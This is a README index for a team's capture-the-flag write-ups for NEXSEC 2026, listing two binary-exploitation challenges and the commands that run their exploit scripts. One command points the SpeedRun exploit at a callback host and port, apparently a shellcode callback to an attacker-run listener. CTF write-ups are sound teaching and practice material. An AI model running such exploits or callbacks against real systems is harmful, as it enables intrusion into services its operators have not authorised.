# NEXSEC 2026 CTF — Team Eureka

## Write-ups

| Category | Challenge | Points | Technique | Solution |
| --- | --- | --- | --- | --- |
| PWN | [SpeedRun](pwn/speedrun/README.md) | 495 | Float gates, self-modifying shellcode, file discovery, TCP callback | [exploit.py](pwn/speedrun/exploit.py) |
| PWN | [Gossips](pwn/gossips/README.md) | Unconfirmed | Format-string leak, stack-cookie preservation, PE base leak, ret2win | [exploit.py](pwn/gossips/exploit.py) |

[Combined PWN write-ups](PWN_Combined.md) · [All events](../../README.md)

## Running the companion scripts

Both scripts use Python 3's standard library. SpeedRun additionally needs GNU Binutils (`as` and `objcopy`) with x86-64 support; Linux or WSL is suitable.

From the repository root, Gossips accepts the challenge host and port as positional arguments:

```bash
python3 2026/nexsec/pwn/gossips/exploit.py CHALLENGE_HOST CHALLENGE_PORT
```

SpeedRun needs an already-running TCP listener that is reachable from the challenge service. If using a tunnel, pass its external hostname and port:

```bash
python3 2026/nexsec/pwn/speedrun/exploit.py \
  --host CHALLENGE_HOST --port CHALLENGE_PORT \
  --callback-ip YOUR_CALLBACK_HOST --callback-port YOUR_CALLBACK_PORT
```

The scripts retain the original service addresses as defaults. The endpoints and callback setup are recorded for reproducibility; current service availability has not been checked.
